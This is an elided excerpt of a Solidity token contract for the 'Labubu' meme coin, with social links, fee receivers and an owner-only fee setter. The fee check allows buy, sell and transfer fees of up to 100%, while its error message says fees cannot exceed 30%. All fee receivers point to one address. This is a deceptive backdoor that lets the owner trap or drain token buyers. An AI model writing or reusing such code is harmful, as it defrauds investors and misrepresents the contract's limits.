...
TG: https://t.me/labubuoneth
X: https://x.com/LabubuOnEth
IG: https://www.instagram.com/labubuoneth
Website: https://labubuoneth.com/
*/
...
contract LABUBU is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'Labubu';
    string private constant _symbol = 'LABUBU';
    ...
    address internal development_receiver = 0xFF88bb64003b4D40258a977CBcA7f89360B2D62B; 
    address internal marketing_receiver = 0xFF88bb64003b4D40258a977CBcA7f89360B2D62B;
    address internal liquidity_receiver = 0xFF88bb64003b4D40258a977CBcA7f89360B2D62B;
    ...
    function setTransactionRequireB(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        ...
        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "totalFee and sellFee cannot be more than 30%");
    }
